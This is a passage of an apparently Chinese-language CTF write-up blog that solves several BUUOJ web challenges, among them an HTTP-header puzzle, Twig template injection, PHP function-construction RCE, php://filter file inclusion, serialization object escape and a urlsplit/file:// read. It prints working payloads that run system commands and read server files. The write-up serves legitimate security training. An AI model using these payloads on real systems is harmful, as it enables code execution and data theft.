&#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, Your path would be more exciting if it ended in !</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, Your URL did not ask to </code>get<code>the</code>flag<code> in its query string.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was looking for a parameter named &amp;=&amp;=&amp;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p>得到</p><p><code>I&#39;m sorry, I expected &#39;&amp;=&amp;=&amp;&#39; to equal &#39;%00 #这有个换行符的 &#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, Basically, I was expecting the username player.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:player&#39; # 暂时不知道密码，随便输一个</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string &#39;open sesame&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was expecting you to be using a 1337 Browser.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was expecting your browser version (v.XXXX) to be over 9000!</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was eXpecting this to be Forwarded-For someone!</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 127.0.0.1&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was eXpecting this to be Forwarded For someone through another proxy!</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 1.1.1.1,127.0.0.1&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was expecting the forwarding client to be 13.37.13.37</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was expecting a Fortune Cookie</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;Fuxku&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was expecting the cookie to contain the number of the HTTP Cookie (State Management Mechanism) RFC from 2011.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里需要cookie包含2021年的RFC编号，可以到这查https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-ietf-httpstate-cookie&#x2F;23&#x2F;</span><br><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I expect you to accept only plain text media (MIME) type.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, Я ожидал, что вы говорите по-русски.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39; -H &#39;origin: https:&#x2F;&#x2F;ctf.bsidessf.net&#39;</span><br></pre></td></tr></table></figure><p>得到<code>I&#39;m sorry, I was expecting you would be refered by https://ctf.bsidessf.net/challenges?</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39; -H &#39;origin: https:&#x2F;&#x2F;ctf.bsidessf.net&#39; -e &#39;https:&#x2F;&#x2F;ctf.bsidessf.net&#x2F;challenges&#39;</span><br></pre></td></tr></table></figure><p>最终得到flag</p><blockquote><p>flag{a3dda583-ca36-4b88-935f-cb4bbbeef896}</p></blockquote><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h3 id="SSTI-Twig"><a href="#SSTI-Twig" class="headerlink" title="SSTI(Twig"></a>SSTI(Twig</h3><p>Twig的模板注入，判断如下：</p>49 回显7777777 => Jinja2 ，回显49 => Twig<p>payload</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>拿到flag</p><blockquote><p>flag{c485b15c-f3df-4dc8-abb3-ed322ea30c66}</p></blockquote><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><h3 id="php函数拼接"><a href="#php函数拼接" class="headerlink" title="php函数拼接"></a>php函数拼接</h3><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;pi&#125;(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure><p>base_convert(37907361743,10,36)构造函数名hex2bin，hex2bin可以将十六进制转换为ASCII字符</p><p>先使用dechex函数将<code>1598506324</code>转换为十六进制，然后再使用hex2bin将十六进制转换成ASCII字符即可得到_GET</p><h3 id="php特性利用"><a href="#php特性利用" class="headerlink" title="php特性利用"></a>php特性利用</h3><p>php中可以使用{}代替[]，然后再拼接一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$$pi</span>&#123;pi&#125; =&gt; <span class="variable">$_GET</span>&#123;pi&#125;</span><br><span class="line">(<span class="variable">$$pi</span>&#123;abs&#125;) =&gt; (<span class="variable">$_GET</span>&#123;abs&#125;)</span><br></pre></td></tr></table></figure><p>最后传入<code>pi=system，abs=cat /flag</code>即可得到flag</p><blockquote><p>flag{693ee03e-518a-46bb-9102-79ac9f502b31}</p></blockquote><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><h3 id="php伪协议嵌套"><a href="#php伪协议嵌套" class="headerlink" title="php伪协议嵌套"></a>php伪协议嵌套</h3><p>利用php伪协议可以读取到index的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/resource=index</span></span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span>) !== <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span>) !== <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现需要包括<code>woofers</code>、<code>meowers</code>、<code>index</code>才会运行文件包含</p><p>查了查之后知道了php的<code>php://filter</code>伪协议可以嵌套一层协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/index/resource=flag</span></span><br></pre></td></tr></table></figure><p>即可得到flag</p><blockquote><p>flag{ff24c3cf-9d00-4527-acab-ee177724d0a1}</p></blockquote><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><h3 id="phpinfo信息获取"><a href="#phpinfo信息获取" class="headerlink" title="phpinfo信息获取"></a>phpinfo信息获取</h3><p>看到题目中有个<code>eval(&#39;phpinfo();&#39;);</code></p><p>打开后在phpinfo里发现了一个<code>d0g3_f1ag.php</code></p><h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>题目所给的源代码中有extract函数，可形成变量覆盖漏洞，<a href="https://blog.csdn.net/weixin_34486302/article/details/115153306?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161857274516780357224643%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161857274516780357224643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-115153306.first_rank_v2_pc_rank_v29&utm_term=extract%E5%AF%BC%E8%87%B4%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96&spm=1018.2226.3001.4187">具体看这</a></p><p>于是可以重新传入SESSION参数进行覆盖</p><h3 id="反序列化对象逃逸"><a href="#反序列化对象逃逸" class="headerlink" title="反序列化对象逃逸"></a>反序列化对象逃逸</h3><p>由题目可知，想要得到flag，必须得构造一个img=d0g3_f1ag.php，但是如果直接传入d0g3_f1ag.php则会被正则替换掉</p><p>于是可以使用反序列化的对象逃逸性质</p><p>正常序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;ababab&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>] = base64_encode(<span class="string">&#x27;d0g3_f1ag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure><p>可以得到</p><blockquote><p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:6:”ababab”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p></blockquote><p>于是我们可以这样POST</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>会得到这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>解释一下.jpg</code></p><p>按照上面POST的序列化，可以得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>而flag被过滤了，于是会得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>由于user的参数为24，而原来的6个flag变为””了，所以会往后继续读取参数</p><p>所以[]的参数就被读取为user的参数了，而原来的function则被替换掉了，再加上最后的}闭合，后面的img也被替换掉了，就造成了反序列化的对象逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;[&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a]&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>最后则通过提示flag在<code>/d0g3_fllllllag</code>中，重新放个base64进去得到flag</p><blockquote><p>flag{f7eb2141-7201-43fe-b97d-cc5defacd03d}</p></blockquote><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><h3 id="urlsplit函数处理问题"><a href="#urlsplit函数处理问题" class="headerlink" title="urlsplit函数处理问题"></a>urlsplit函数处理问题</h3><p>题目首先调用了urlsplit函数，讲url分割后判断是否为<code>suctf.cc</code></p><p>然后后面有调用了unurlsplit函数将url合起来，再次判断是否为<code>suctf.cc</code></p><p>测试函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;file:////suctf.cc/abababab&quot;</span></span><br><span class="line">parts = parse.urlsplit(url)</span><br><span class="line">print(parts)</span><br><span class="line"></span><br><span class="line">url2 = urlunsplit(parts)</span><br><span class="line">parts2 = parse.urlsplit(url2)</span><br><span class="line">print(parts2)</span><br></pre></td></tr></table></figure><p>则可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SplitResult(scheme=<span class="string">&#x27;file&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;//suctf.cc/abababab&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">SplitResult(scheme=<span class="string">&#x27;file&#x27;</span>, netloc=<span class="string">&#x27;suctf.cc&#x27;</span>, path=<span class="string">&#x27;/abababab&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这就可以成功绕过前面分割后的判断语句</p><h3 id="nginx的配置"><a href="#nginx的配置" class="headerlink" title="nginx的配置"></a>nginx的配置</h3><blockquote><p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p></blockquote><p>这就可以构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>得到一个flag路径<code>/usr/fffffflag</code></p><p>获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure><blockquote><p>flag{23da88ac-576f-4e40-819a-06e1c7da43fb}</p></blockquote><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>进入robots.txt发现一个/fAke_f1agggg.php，进去后在http协议头上发现了一个fl4g.php</p><p>进入后是一串代码审计</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>首先第一串是intval函数绕过，优化一下代码，我们是要使之echo 1才能绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload</p><blockquote><p>?num=1e5</p></blockquote><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>然后是md5绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们得遍历出来一个md5前是0e开头并且md5后还是0e开头的字符串</p><p>构造payload</p><blockquote><p>?num=1e5&amp;md5=0e215962017</p></blockquote><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>最后就是命令注入的简单过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span 